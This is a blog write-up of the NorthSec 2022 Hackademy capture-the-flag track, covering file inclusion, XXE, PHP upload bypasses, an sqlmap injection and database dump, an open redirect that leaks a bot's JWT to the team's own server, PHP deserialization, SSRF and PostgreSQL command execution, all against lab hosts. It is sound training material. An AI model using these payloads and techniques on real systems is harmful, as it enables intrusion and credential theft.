---
layout: post
title: "Northsec Hackademy"
date: 2022-05-28
image: /will-hack-for-coffee/assets/images/nsec2022/hackademy.png
---

This year I participated again in NorthSec CTF. In the weeks prior to the events small challenges were annouced called warmups. There was signal analysis, git secret recovery, code audit, fuzzing, some NFT Shenanigan and more. Some were pretty rough but there was plenty hints that were added to allowed people to catch up. 

As for the CTF itself, the scenario was that you were pentesting a new startup company involved in NFT, metaverse and crypto currencies. Most of the challenges were insanely hard but like last year there was trivia questions related to hackers movies and the beginner track: Hackademy. It was the same track as last year with some minor changes and I took the time to complete every challenge, asking for help to solve some of them. 

Here is the writeup for the Hackademy track.

![Hackademy website](/will-hack-for-coffee/assets/images/nsec2022/hackademy.png)

## Automatization 101 and 102

So the first site was under construction. Looking at the source code I found the first flag:
````
<!DOCTYPE html>
<html>
    <head>
        <title>NorthSec Hackademy</title>
    </head>
    <body>
        <div class="container">
            Site is under construction...<!-- FLAG-7c343e260bad642afa1c589687b815b7 (1/2) -->
        </div>
    </body>
</html>
````

Looking at the robots.txt I found the second flag:
````
User-agent: *
Disallow: secret-4e93a07c19d253e8.txt

FLAG-3564934ce48dd205525279f69be8a810 (2/2)
````

## Inclusion 101, 102, 103

A classic local file inclusion exist on this site. The URL is:

http://chal2.hackademy.ctf/?page=welcome.php

What if I specified /etc/passwd instead of welcome.php? Well here is our trainer:
````
...
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
trainer:x:1001:1001:Trainer:FLAG-446fd3bcb4a9c08cd5cb25e113aaa1e5,,,,:/bin/false:/sbin/nologin
````
For the next one, you need to look at the source code. PHP has a nice feature that allows you to convert a file to base64. In our case it will prevent index.php from being interpreted. So I tried this URL:

http://chal2.hackademy.ctf/?page=php://filter/convert.base64-encode/resource=index.php

It outputted a long base64 string. Decoding the resulting string I got the source code which included the flag:
````
<?php
    #FLAG-8f54c17252eb57ff6cf91f97828f3f54 (2/2)
    if(!isset($_GET["page"])){
        header("Location: ?page=welcome.php");
        die();
    }

    $page = $_GET["page"];
    if(strpos($_GET["page"], "index.php") !== false && !preg_match("/.*=([.\/]*)?index.php$/", $_GET["page"])){
        header("Location: ?page=welcome.php");
        die();
    }
?>
<!DOCTYPE html>
<html>
    <head>
    ...
````
Last of these challenge use XML external entity injection (XXE). Hopefully an [enraged hacker](https://gitlab.com/sebast331-ctf/laravulnerable/-/blob/master/app/vulns.md) reminded me of the technique. Looking at the source code:

![Inclusion 3 source code](/will-hack-for-coffee/assets/images/nsec2022/inclusion3-source.png)

I sent the POST from the underlying Javascript AJAX request to my Burp Repeater tab and edited the body parameter so the content of the passwd file is shown through the ext variable on the website.
![XXE](/will-hack-for-coffee/assets/images/nsec2022/xxe.png)

## Upload 101, 102, 103 and 104

So here the challenges are to upload a php file (with potential remote code execution) while evading validation.

![File upload website](/will-hack-for-coffee/assets/images/nsec2022/file-upload.png)

So for the first challenge I renamed my file to reverse.jpg.php. The file will be interpreted as PHP and my code could be executed. The validation probably only checked if the allowed extension was in the filename.

For the second challenge I needed to modify the Content-Type header for image/jpeg with the following value:

![Content-Type header](/will-hack-for-coffee/assets/images/nsec2022/content-type.png)

For the third challenge I submitted the same file and it warn me that the signature didn't match a JPEG file. So I used the website hexed.it and modified the [signature](https://en.wikipedia.org/wiki/List_of_file_signatures). 

![Hexed.it](/will-hack-for-coffee/assets/images/nsec2022/hexed.png)

The resulting forged file was uploaded (again modifying the Content-Type header).

For the fourth upload challenge I renamed the file to rev.png.php3 a less known but still valid PHP extension. The validation must have been a blacklist on .php extension.

## SQL 101 and 102

Those two challenges were about SQL injection and the website consisted of a login form. A nice tip that I learned from Burp is that you can submit a single quote (') to a form to test for SQL injection. If there is an error there a strong possibility that it's vulnerable to SQL injection. The first challenge was an authentication bypass: 

![SQL injection 102](/will-hack-for-coffee/assets/images/nsec2022/sql-injection102.png)

It worked because the query returns one (empty) row. It also gives us a hint for the other challenge. Last year I suggested to a teammate that he could have used [sqlmap to solve that challenge](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellQueryLanguage/#flag-1) but I didn't took the time to try it myself. Here is the command that worked for me:
````
└─$ sqlmap -u http://chal4.hackademy.ctf --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ
        ___
       __H__                                                                                         
 ___ ___[.]_____ ___ ___  {1.6.5#stable}                                                             
|_ -| . [.]     | .'| . |                                                                            
|___|_  [,]_|_|_|__,|  _|                                                                            
      |_|V...       |_|   https://sqlmap.org                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:53:09 /2022-05-20/

[22:53:09] [INFO] resuming back-end DBMS 'sqlite' 
[22:53:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: password=admin&username=admin' AND 1182=1182 AND 'RANU'='RANU

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: password=admin&username=admin' AND 4961=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'OrQH'='OrQH
---
[22:53:09] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[22:53:09] [WARNING] on SQLite it is not possible to get name of the current database
[22:53:09] [INFO] fetching tables for database: 'SQLite_masterdb'
[22:53:09] [INFO] fetching number of tables for database 'SQLite_masterdb'
[22:53:09] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:53:09] [INFO] retrieved: 2
[22:53:09] [INFO] retrieved: fl4G_1s_H3re
[22:53:13] [INFO] retrieved: users
[22:53:14] [INFO] retrieved: CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)
[22:53:41] [INFO] fetching entries for table 'users'
[22:53:41] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[22:53:41] [INFO] retrieved: 1
[22:53:42] [INFO] retrieved: 1
[22:53:42] [INFO] retrieved: FLABbergasted!
[22:53:45] [INFO] retrieved: admin
Database: <current>
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | FLABbergasted! | admin    |
+----+----------------+----------+

[22:53:47] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/chal4.hackademy.ctf/dump/SQLite_masterdb/users.csv'                                             
[22:53:47] [INFO] retrieved: CREATE TABLE fl4G_1s_H3re (apprentice_flagTODO TEXT NOT NULL)
[22:54:03] [INFO] fetching entries for table 'fl4G_1s_H3re'
[22:54:03] [INFO] fetching number of entries for table 'fl4G_1s_H3re' in database 'SQLite_masterdb'
[22:54:03] [INFO] retrieved: 1
[22:54:03] [INFO] retrieved: FLAG-b6c00f68954057dd09658be5d187aac5 (1/2). If you don't already have, try to bypass the login (still with the injection).
Database: <current>
Table: fl4G_1s_H3re
[1 entry]
+-----------------------------------------------------------------------------------------------------------------------------+
| apprentice_flagTODO                                                                                                         |
+-----------------------------------------------------------------------------------------------------------------------------+
| FLAG-b6c00f68954057dd09658be5d187aac5 (1/2). If you don't already have, try to bypass the login (still with the injection). |
+-----------------------------------------------------------------------------------------------------------------------------+
...
````
sqlmap exfiltrated all the database and revealead the flag in the table fl4G_1s_H3re. 

## Open redirect 101

I tought open redirect was a minor vulnerability? I browsed the site and there was two links:

![Open redirect 101](/will-hack-for-coffee/assets/images/nsec2022/open-redirect101.png)

Navigating the first link and looking at Burp I saw that there was a redirect containing a Jason Web Token token:

![JWT redirect](/will-hack-for-coffee/assets/images/nsec2022/jwt-redirect.png)

You can use [jwt.io](jwt.io) confirm it's a JWT and check what's inside the token:

![jwt.io](/will-hack-for-coffee/assets/images/nsec2022/jwt-io.png)

The next link on the website allows you to provide an URL and the "Grand master pentester" will visit it. Our team owned a small server on the NorthSec network so I redirected him there instead:

http://chal5.hackademy.ctf/?sub_url=http://shell.ctf

Looking at our server log:
````
...
root@ctn-shell:/var/log/apache2#cat access.log
...
9000:91a:201:cdba:216:3eff:fe01:b3fd - - [21/May/2022:05:56:49 +0000] "GET /?identity=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9zdWIuY2hhbDUuaGFja2FkZW15LmN0ZlwvIiwiaWF0IjoxNjUzMTEyNjA5LCJuYmYiOjE2NTMxMTI2MDksImV4cCI6MTY1MzExMjkwOSwidXNlciI6IlVuZm9ydHVuYXRlIFBlbnRlc3RlciIsInJvbGUiOiJHcmFuZCBNYXN0ZXIgUGVudGVzdGVyIn0.Cv8ROC8pX7HMXwSnjgtYvQbqFVEc2xOqEz9dLiDnt0s HTTP/1.1" 200 11173 "-" "-"
````
I can see his credentials and I used it to log as my "master".

![Grand master credentials](/will-hack-for-coffee/assets/images/nsec2022/grand-master-credentials.png)

### Serialize 101

A simple Hello word! page with the source available. There is also weird s parameter that I will tamper with later.

![Serialize 101](/will-hack-for-coffee/assets/images/nsec2022/serialize101.png)

Looking at the source:
````
<?php
    if(isset($_GET["source"])){
        highlight_string(preg_replace("/(FLAG-[a-f0-9]{32})/", "FLAG-".str_repeat("x", 32), file_get_contents(__file__)));
        die();
    }
    class Hackademy{
        private $call = "WelcomeMessage";

        public function __construct() {

        }

        public function __wakeup(){
            $this->{$this->call}();
        }

        public function WelcomeMessage(){
            echo "Hello World!";
        }

        public function GiveMeFlagPrettyPlease(){
            echo "FLAG-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
        }
    }
?>
<!DOCTYPE html>
<html>
    <head>
        <title>NorthSec Hackademy</title>
        <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
        <script type="text/javascript" src="js/bootstrap.bundle.min.js"></script>
        <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    </head>
    <body>
        <div class="container">
            <a href="?source">Source here!</a><hr>
            <?php if(!isset($_GET["s"])){header("Location: ?s=".base64_encode(serialize(new Hackademy())));}else{unserialize(base64_decode($_GET["s"]));} ?>
        </div>
    </body>
</html>
````

The flag is in the source code but it's replaced by x if it's viewed from the link. It took me some time to understand this challenge even if I [ripped](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellrialize/) it from a friend. PHP use the [serialize](https://www.php.net/manual/en/function.serialize.php) function so it can pass objects as strings in the parameters. It will then automatically launch the __wakeup function which will execute the WelcomeMessage function. What I will do is create a new object that will call the GiveMeFlagPrettyPlease function instead (by setting a property of the object). A [wise man](https://www.mindkind.org/index.php) told me that I could use php in kali to run script, so I created this little script: 
````
<?php
    class Hackademy{
        private $call = "GiveMeFlagPrettyPlease";
}
?>
echo base64_encode(serialize(new Hackademy()));
````
Ran it:
````
└─$ php serialize.php  
Tzo5OiJIYWNrYWRlbXkiOjE6e3M6MTU6IgBIYWNrYWRlbXkAY2FsbCI7czoyMjoiR2l2ZU1lRmxhZ1ByZXR0eVBsZWFzZSI7fQ== 
````
Then used that base64 string in the s parameter and got the flag.

## Server Side Request Forgery 101, 102 and 103

This website allows you to send some commands like ping and such. But you can also use any other protocol and obtain file located on the server and it will not be interpretated. Let's take a look at the config file of the API:

![Server Side Request Forgery 101](/will-hack-for-coffee/assets/images/nsec2022/ssrf101.png)

So here is the first flag with some bonus database credentials. Here is another important file used by the Apache server:

````
file:///etc/apache2/sites-enabled/000-default.conf

<VirtualHost *:80>
    ServerName localhost
    DocumentRoot /var/www/html/api
</VirtualHost>

<VirtualHost *:8080>
    ServerName localhost
    DocumentRoot /var/www/html/database

    <Directory /var/www/html/database>
        Order deny,allow
        Deny from all
        Allow from ::1
        Allow from localhost
    </Directory>
</VirtualHost>
````
So that's where the database is but it can only be accessed locally from the server. I was a bit confused for that part but an [enraged hacker (who is also a SQL genius)](https://www.youtube.com/watch?v=q95L-epzYnw) gently nudged me in the right direction. Let's take a look at the source code of the database webpage:
````
<?php 
    if(isset($_POST['user'], $_POST['password'])) {
        try{
            $conn = new PDO("pgsql:host=localhost;port=5432;", $_POST['user'], $_POST['password'], array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
        } catch (PDOException $e){
            echo "You are not authorized to access this, get out!";
            die();
        }
        if(isset($_POST["query"])){
            try{
                $cursor = $conn->query($_POST["query"]);
                $results = $cursor->fetchall(PDO::FETCH_ASSOC);
                if(!empty($results)){
                    $columns = array_keys($results[0]);
                    echo implode(" | ", $columns)."\n";
                    foreach ($results as $key => $value) {
                        echo implode(" | ", $value)."\n";
                    }
                }
            } catch(PDOException $e) {
                echo "Seems like your query failed, try again young pentester!";
                die();
            }
        } else {
            echo "Yes, yes.. I'm alive. What is it?";
            die();
        }
    } else {
        echo "Only a real pentester can access the database.";
        die();
    }
````
Let's query the table of that database (we can guess it's a PostgreSQL database from the user) using a default database table:

![Server Side Request Forgery 102](/will-hack-for-coffee/assets/images/nsec2022/ssrf102.png)

Then I used those parameters to get the flag:
````
user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_25bb3839f80731bb
````

In last year CTF, the flag was in a flag.txt located at the root folder so we lucked out getting it. This year this was fixed so I had to use remote command injection (reverse shell would have been even [better](https://erichogue.ca/2022/05/NorthSec/HackademyForgery#forgery-103---obtain-hrce-hackademy-recognized-certified-expert)!). It's well [explained](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) here and it work well even if the syntax is kinda weird (maybe disable this on your production server?):

![Postgresql remote command execution](/will-hack-for-coffee/assets/images/nsec2022/postgresql-rce.png)

But instead of logging in the database you use the query to create the table, copy your command and execute them. Looking at the root folder I listed the flag and read it. Congratulation and enjoy your newly acquired Hackademy Certified Ethical Hacker!
